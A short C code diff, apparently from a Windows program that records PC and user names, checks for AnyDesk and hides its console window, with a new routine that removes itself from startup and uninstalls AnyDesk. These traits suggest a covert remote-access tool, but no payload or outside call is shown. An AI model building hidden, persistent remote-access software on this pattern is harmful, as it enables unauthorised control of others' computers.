@@ -16,7 +16,7 @@ void hideConsoleWindow();
 struct PcDetails {
     char computerName[15 + 1]; // The maximum length of computer name is 15 characters + \0 
     char userName[256 + 1]; // The maximum length of computer name is 256 characters + \0 
-    bool isAnyDeskInstalled;
+    int isAnyDeskInstalled; // 2 is true 0 is false,
 };
 
 int startsWith(const char *a, const char *b)
@@ -65,4 +65,9 @@ void hideConsoleWindow()
     AllocConsole();
     window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
+}
+
+void uninstallProgram() {
+    RemoveMyProgramFromStartup();
+    uninstallAnyDesk();
 }
